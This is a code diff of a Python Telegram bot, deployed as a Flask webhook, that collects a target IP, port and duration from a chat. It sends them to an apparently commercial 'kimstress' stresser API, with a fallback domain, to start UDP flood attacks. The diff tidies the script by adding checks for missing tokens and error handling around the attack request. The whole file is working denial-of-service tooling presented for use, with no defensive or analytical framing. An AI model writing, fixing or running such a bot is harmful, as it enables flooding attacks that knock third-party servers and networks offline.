@@ -15,11 +15,14 @@ from telegram.ext import (
 # ================= CONFIGURATION =================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 KIMSTRESS_TOKEN = os.environ.get("KIMSTRESS_TOKEN")
-KIMSTRESS_API_URL = "https://kimstress.st/attack"   # adjust if needed
+KIMSTRESS_API_URL = "https://kimstress.st/attack"
 # =================================================
 
 # Enable logging
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
 # Conversation states
@@ -27,6 +30,12 @@ IP, PORT, DURATION = range(3)
 
 # Create Flask app
 app = Flask(__name__)
+
+# Check if tokens are set
+if not TELEGRAM_BOT_TOKEN:
+    logger.error("TELEGRAM_BOT_TOKEN environment variable is not set!")
+if not KIMSTRESS_TOKEN:
+    logger.error("KIMSTRESS_TOKEN environment variable is not set!")
 
 # Build the Telegram Application instance
 application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
@@ -89,7 +98,7 @@ async def get_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🚀 Sending attack to {ip}:{port} for {dur} seconds...")
 
-    # Build API request – adjust headers based on actual KIMSTRESS API
+    # Build API request
     headers = {
         "Authorization": f"Bearer {KIMSTRESS_TOKEN}",
         "Content-Type": "application/x-www-form-urlencoded"
@@ -98,27 +107,24 @@ async def get_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "address": ip,
         "port": port,
         "duration": dur,
-        "method": "UDP-FREE",      # adjust if you have other methods
+        "method": "UDP-FREE",
         "concurrents": 1
     }
 
     try:
-        # Try with the main URL
         resp = requests.post(KIMSTRESS_API_URL, data=payload, headers=headers, timeout=15)
         if resp.status_code == 200:
             await update.message.reply_text("✅ Attack started successfully!")
         else:
-            # Fallback to backup domain
             backup_url = "https://kimstress.com/attack"
             resp2 = requests.post(backup_url, data=payload, headers=headers, timeout=15)
             if resp2.status_code == 200:
                 await update.message.reply_text("✅ Attack started via backup domain!")
             else:
-                await update.message.reply_text(f"❌ Failed. Status: {resp.status_code}\nResponse: {resp.text[:200]}")
+                await update.message.reply_text(f"❌ Failed. Status: {resp.status_code}")
     except Exception as e:
         await update.message.reply_text(f"⚠️ Error: {str(e)}")
 
-    # End conversation
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -142,7 +148,6 @@ application.add_handler(conv_handler)
 # ============= WEBHOOK ENDPOINT =============
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Receive updates from Telegram."""
     try:
         update = Update.de_json(request.get_json(force=True), application.bot)
         application.process_update(update)
@@ -157,15 +162,17 @@ def index():
 
 # ============= MAIN =============
 if __name__ == '__main__':
-    # Get the public URL from Render's environment variable
     render_hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
-    if render_hostname:
+    if render_hostname and TELEGRAM_BOT_TOKEN:
         webhook_url = f"https://{render_hostname}/webhook"
         logger.info(f"Setting webhook to: {webhook_url}")
-        application.bot.set_webhook(webhook_url)
+        try:
+            application.bot.set_webhook(webhook_url)
+            logger.info("Webhook set successfully")
+        except Exception as e:
+            logger.error(f"Failed to set webhook: {e}")
     else:
-        logger.warning("RENDER_EXTERNAL_HOSTNAME not set, skipping webhook setup. Use local dev with polling.")
+        logger.warning("RENDER_EXTERNAL_HOSTNAME not set or token missing")
 
-    # Start Flask server
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
